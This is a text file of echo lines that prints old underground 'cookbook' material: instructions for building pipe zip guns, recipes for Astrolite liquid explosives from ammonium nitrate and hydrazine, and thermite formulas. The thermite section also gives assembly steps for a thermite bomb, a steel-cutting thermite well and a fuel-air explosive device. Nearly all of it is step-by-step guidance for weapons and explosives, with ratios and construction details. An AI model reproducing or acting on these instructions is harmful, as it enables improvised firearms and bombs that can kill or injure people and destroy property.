echo The pipe is a short length of one-quarter inch steel gas or water pipe with a bore that fits in a cartridge, yet keeps the cartridge rim from 
echo passing through the pipe.
echo The cartridge is put in the pipe and the cap, with a hole bored through it, is screwed on. Then the trigger is slowly released to let the nail pass 
echo through the hole and rest on the primer.
echo  To fire, the trigger is pulled back with the left hand and held back with
echo the thumb of the right hand. The gun is then aimed and the thumb releases the
echo trigger and the thing actually fires.
echo Pipes of different lengths and diameters are found in any hardware store. All caliber bullets, from the .22 to the .45 are used in such guns.
echo Some zip guns are made from two or three pipes nested within each other. For instance, a .22 shell will fit snugly into a length of a car's 
echo copper gas line. Unfortunately, the copper is too weak to withstand the pressure of the firing. So the length of gas line is spread with glue and 
echo pushed into a wider length of pipe. This is spread with glue and pushed into a length of steel pipe with threads and a cap.
echo Using this method, you can accommodate any cartridge, even a rifle shell. The first size of pipe for a rifle shell accommodates the bullet. The 
echo second accommodates its wider powder chamber.
echo A 12-gauge shotgun can be made from a 3/4 inch steel pipe. If you want to comply with the gun laws, the barrel should be at least eighteen 
echo inches long.
echo Its firing mechanism is the same as that for the pistol. It naturally has a longer stock and its handle is lengthened into a rifle butt. Also, a small 
echo nail is driven half way into each side of the stock about four inches in the front of the trigger. The rubber band is put over one nail and brought 
echo around the trigger and snagged over the other nail.
echo In case you actually make a zip gun, you should test it before firing it by hand. This is done by first tying the gun to a tree or post, pointed to 
echo where it will do no damage. Then a string is tied to the trigger and you go off several yards. The string is then pulled back and let go. If the 
echo barrel does not blow up, the gun is (probably) safe to fire by hand. Repeat firings may weaken the barrel, so NO zip gun can be considered 
echo "safe" to use.
echo Astrolite and Sodium Chlorate Explosives 
echo By: Future Spy and The Fighting Falcon
echo Note: Information on the Astrolite Explosives were taken from the book 'Two Component High Explosive Mixtures' By Desert Pub'l
echo Some of the chemicals used are somewhat toxic, but who gives a fuck I won't even bother mentioning 'This information is for 
echo enlightening purposes only'
echo Astrolite
echo The astrolite family of liquid explosives were products of rocket propellant research in the '60's. Astrolite A-1-5 is supposed to be the world's 
echo most powerful non-nuclear explosive -at about 1.8 to 2 times more powerful than TNT. Being more powerful it is also safer to handle than TNT 
echo (not that it isn't safe in the first place) and Nitroglycerin.
echo Astrolite G
echo "Astrolite G is a clear liquid explosive especially designed to produce very high detonation velocity, 8,600MPS (meters/sec.), compared with 
echo 7,700MPS for nitroglycerin and 6,900MPS for TNT...In addition, a very unusual characteristic is that it the liquid explosive has the ability to be 
echo absorbed easily into the ground while remaining detonatable...In field tests, Astrolite G has remained detonatable for 4 days in the ground, even 
echo when the soil was soaked due to rainy weather" know what that means?....Astrolite Dynamite
echo To make (mix in fairly large container and outside) Two parts by weight of ammonium nitrate mixed with one part by weight 'anhydrous' 
echo hydrazine, produces Astrolite G...Simple enough eh? I'm sure that the 2:1 ratio is not perfect, and that if you screw around with it long enough, 
echo that you'll find a better formula. Also, dunno why the book says 'anhydrous' hydrazine, hydrazine is already anhydrous...
echo Hydrazine is the chemical you'll probably have the hardest time getting hold of. Uses for Hydrazine are: Rocket fuel, agricultural chemicals 
echo (maleic hydra-zide), drugs (antibacterial and antihypertension), polymerization catalyst, plating metals on glass and plastics, solder fluxes, 
echo photographic developers, diving equipment. Hydrazine is also the chemical you should be careful with.
echo Astrolite A/A-1-5
echo Mix "20%" (weight) aluminum powder to the ammonium nitrate, and then mix with hydrazine. The aluminum powder should be 100 mesh or finer. 
echo Astrolite A has a detonation velocity of 7,800MPS.
echo Misc Info
echo You should be careful not to get any of the astrolite on you, if it happens though, you should flush the area with water. Astrolite AandG both 
echo should be able to be detonated by a #8 blasting cap.
echo Sodium Chlorate Formulas
echo Sodium Chlorate is similar to potassium chlorate, and in most cases can be a substitute. Sodium chlorate is also more soluble in water. You can 
echo find sodium chlorate at Channel or any hardware/home improvement store. It is used in blowtorches and you can get about 3 lbs for about

echo 219.Thermite IV by Kilroy
echo DISCLAIMER :
echo The making and possession of the following devices and mixtures is probably illegal in most communities. The incendiaries are capable of 
echo burning in excess of 5400øF and are next to impossible to extinguish. If you make them you accept all responsibility for their possession and 
echo use. You also accept all responsibility for your own stupidity and carelessness. This information is intended solely to educate. All Formulas are 
echo by Weight
echo Thermites are a group of pyrotechnics mixtures in which a reactive metal reduces oxygen from a metallic oxide. This produces a lot of heat, 
echo slag and pure metal. The most common thermite is ferroaluminum thermite, made from aluminum (reactive metal) and iron oxide (metal oxide). 
echo When it burns it produces aluminum oxide (slag) and pure iron. Thermite is usually used to cut or weld metal. As an experiment, a 3 lb. brick of 
echo thermite was placed on an aluminum engine block. After the thermite was done burning, only a small portion of block was melted. However, the 
echo block was very warped out of shape plus there were cracks all through the block. Ferro-thermite produces about 930 calories per gram The 
echo usual proportions of ferro-thermite are 25% aluminum and 75% iron oxide The iron oxide usually used is not rust (Fe2O3) but iron scale 
echo (Fe3O4). Rust will work but you may want to adjust the mixture to about 77% rust. The aluminum is usually coarse powder to help slow down 
echo the burning rate. The chemicals are mixed together thoroughly and compressed into a suitable container. A first fire mix is poured on top and 
echo ignited.
echo NOTE: Thermites are generally very safe to mix and store. They are not shock or friction sensitive and ignite at about 2000øF.
echo A first fire mix is a mixture that ignites easier than thermite and burns hot enough to light the thermite reliably. A very good one is :
echo · Potassium Nitrate 5 parts
echo · Fine ground Aluminum 3 parts 
echo · Sulfur 2 parts
echo  
echo Mix the above thoroughly and combine 2 parts of it with 1 part of finely powdered ferro-thermite. The resulting mixture can be light by safety 
echo fuse and burns intensely.
echo One problem with thermites is the difference in weight between the aluminum and the oxide. This causes them to separate out rendering the 
echo thermite useless. One way to fix this is to use a binder to hold the chemicals to each other. Sulfur is good for this. Called Diasite, this formula 
echo uses sulfur to bind all the chemicals together. It's drawback is the thermite must be heated to melt the sulfur.
echo · Iron Oxide 70 %
echo · Aluminum 23 %
echo · Sulfur 7 %
echo Mix the oxide and aluminum together and put them in an oven at 325øF and let the mix heat for a while. When the mixture is hot sprinkle the 
echo sulfur over it and mix well. Put this back in the oven for a few minutes to melt all the sulfur. Pull it back out and mix it again. While it is still hot, 
echo load into containers for use. When it cools, drill out the diasite to hold about 10 - 15 grams of first fire mix. When diasite burns it forms sulfide 
echo compounds that release hydrogen sulfide when in contact with water. This rotten egg odor can hamper fire fighting efforts. Thermite can be 
echo made not to separate by compressing it under a couple of tons pressure. The resulting pellet is strong and burns slower than thermite powder.
echo CAST THERMITE: This formula can be cast into molds or containers and hardens into a solid mass. It does not produce as much iron as regular 
echo ferro-thermite, but it makes a slag which stays liquid a lot longer. Make a mixtures as follows.
echo · Plaster of Paris 2 parts
echo · Fine and Coarse Mixed Aluminum 2 parts 
echo · Iron Oxide 3 parts
echo Mix together well and add enough water to wet down plaster. Pour it into a mold and let it sit for « hour. Pour off any extra water that 
echo separates out on top. Let this dry in the sun for at least a week. Or dry in the sun for one day and put in a 250øF oven for a couple of hours. 
echo Drill it out for a first fire mix when dry.
echo THERMITE BOMB: Thermite can be made to explode by taking the cast thermite formula and substituting fine powdered aluminum for the 
echo coarse/fine mix. Take 15 grams of first fire mix and put in the center of a piece of aluminum foil. Insert a waterproof fuse into the mix and 
echo gather up the foil around the fuse. Waterproof the foil/fuse with a thin coat of wax. Obtain a two-piece spherical mold with a diameter of about 
echo 4-5 inches. Wax or oil the inside of the mold to help release the thermite. Now, fill one half of the mold with the cast thermite. Put the first 
echo fire/fuse package into the center of the filled mold. Fill the other half of the mold with the thermite and assemble mold. The mold will have to 
echo have a hole in it for the fuse to stick out. In about an hour, carefully separate the mold. You should have a ball of thermite with the first fire mix 
echo in the center of it, and the fuse sticking out of the ball. Dry the ball in the sun for about a week. DO NOT DRY IT IN AN OVEN The fuse ignites 
echo the first fire mix which in turn ignites the thermite. Since the thermite is ignited from the center out, the heat builds up in the thermite and it burns 
echo faster than normal. The result is a small explosion. The thermite ball burns in a split second and throws molten iron and slag around. Use this 
echo carefully 
echo THERMITE WELL: To cut metal with thermite, take a refractory crucible and drill a 1/4 in. hole in the bottom. Epoxy a thin (20 gal) sheet of mild 
echo steel over the hole. Allow the epoxy to dry. Fill the crucible with ferro-thermite and insert a first fire igniter in the thermite. Fashion a standoff to 
echo the crucible. This should hold the crucible about 1 « in. up. Place the well over your target and ignite the first fire. The well works this way. The 
echo thermite burns, making slag and iron. Since the iron is heavier it goes to the bottom of the well. The molten iron burns through the metal sheet. 
echo This produces a small delay which gives the iron and slag more time to separate fully. The molten iron drips out through the hole in the bottom 
echo of the crucible. The standoff allows the thermite to continue flowing out of the crucible. The force of the dripping iron bores a hole in the target. 
echo A 2 lb thermite well can penetrate up to 3/4 in. of steel. Experiment with different configurations to get maximum penetration. For a crucible, try 
echo a flower pot coated with a magnesium oxide layer. Sometimes the pot cracks however. Take the cast thermite formula and add 50% ferrothermite to it. This produces a fair amount of iron plus a very liquid slag.
echo THERMITE FUEL-AIR EXPLOSION: This is a very dangerous device. Ask yourself if you really truly want to make it before you do any work on 
echo it. It is next to impossible to give any dimensions of containers or weights of charges because of the availability of parts changes from one 
echo person to the next. However here is a general description of this device affectionately known as a HELLHOUND.
echo Make a thermite charge in a 1/8 in. wall pipe. This charge must be electrically ignited. At the opposite end of the pipe away from the ignitor side 
echo put a small explosive charge of flash powder weighing about 1 oz Drill a small hole in a pipe end cap and run the wires from the ignitor through 
echo the hole. Seal the wires and hole up with fuel proof epoxy or cement. Try ferrule cement available at sporting goods stores. Dope the threads 
echo of the end caps with a good pipe dope and screw them onto the pipe. This gives you a thermite charge in an iron pipe arranged so that when 
echo the thermite is electrically ignited, it will burn from one end to the other finally setting of the flash powder charge. Place this device in a larger 
echo pipe or very stout metal container which is sealed at one end. Use a couple of metal "spiders" to keep the device away from the walls or ends 
echo of the larger container. Run the wires out through the wall of the container and seal the wires with the fuel proof epoxy. Fill the container with 
echo a volatile liquid fuel. Acetone or gasoline works great. Now seal up the container with an appropriate end cap and it is done.
echo The device works like this: Attach a timer-power supply to the wires. When the thermite is ignited it superheats the liquid fuel. Since the 
echo container is strong enough to hold the pressure the fuel does not boil. When the thermite burns down to the explosive, it explodes rupturing the 
echo container and releasing the superheated fuel. The fuel expands, cooling off and making a fine mist and vapor that mixes with the surrounding 
echo air. The hot thermite slag is also thrown into the air which ignites the fuel-air mix. The result is obvious. Try about 1 « lbs of thermite to a gallon 
echo of fuel. For the pressure vessel, try an old pressure cooker. Because the fuel may dissolve the epoxy don't keep this device around for very 
echo long. But ask yourself, do you really want to make this?
echo EXOTIC THERMITES: Thermites can also be made from teflon-magnesium or metal fluorides-magnesium or aluminum. If there is an excess of 
echo fluoride compound in the mixture, fluorine gas can be released. Fluorine is extremely corrosive and reactive. The gas can cause organic 
echo material to burst into flames by mere contact. For teflon-magnesium use 67% teflon and 33% magnesium. A strong first fire igniter should be 
echo used to ignite this mixture. Both the teflon and the magnesium should be in powdered form. Do not inhale any smoke from the burning mixture. If 
echo you use metal-fluorides instead of teflon, use fluorides of low energy metals. Lead fluoride is a good example. Try using 90% lead fluoride and 
echo 10% aluminum. Warning: Fluoride compounds can be very poisonous. They are approximately equal to cyanide compounds. Another exotic mix 
echo is tricalcium orthophosphate and aluminum. When this burns, it forms calcium phosphide which when contacts water releases hydrogen 
echo phosphide which can ignite spontaneously in air. Tricalcium orthophosphate has the formula Ca3(PO4)2 and is known as white-lockite. Use 
echo about 75% orthophosphate and 25% aluminum. This ratio may have to be altered for better burning as I have not experimented with it much and 
echo don't know if more aluminum may reduce the calcium better. It does work but it is a hard to ignite mixture. A first fire mix containing a few 
echo percent of magnesium works well.
echo Fighting thermite fires: Two ways to fight thermite fires are either smothering the thermite with sand. This doesn't put out the thermite but it 
echo does help contain it and block some of the heat. The other way is to flood the thermite with a great amount of water. This helps to break the 
echo thermite apart and stop the reaction. If you use a small amount of water, an explosion may result as the thermite may reduce the water and 
echo release hydrogen gas. Thermite can start fires from the heat radiating from the reaction. Nearby flammable substances can catch fire even 
echo though no sparks or flame touch them.
